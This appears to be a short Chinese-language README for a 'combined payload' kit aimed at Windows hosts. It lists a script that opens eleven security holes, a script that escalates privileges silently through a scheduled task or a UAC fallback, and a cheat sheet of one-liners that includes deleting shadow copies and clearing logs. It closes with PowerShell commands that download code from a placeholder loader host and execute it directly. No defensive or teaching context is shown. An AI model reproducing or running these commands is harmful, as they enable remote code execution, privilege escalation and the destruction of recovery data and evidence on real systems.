# 组合载荷

| 文件 | 用途 |
|---|---|
| `open_attack_surface.ps1` | 全量开洞 11 项 + `-Revert` 回滚 |
| `ps_elevate.ps1` | 自提升（计划任务静默 / UAC 兜底） |
| `irm_cheatsheet.txt` | 12 条单行速查（含删卷影、清日志） |

```powershell
irm http://LOADER_IP:8090/combined/open_attack_surface.ps1 | iex
irm http://LOADER_IP:8090/combined/open_attack_surface.ps1 -Revert
```
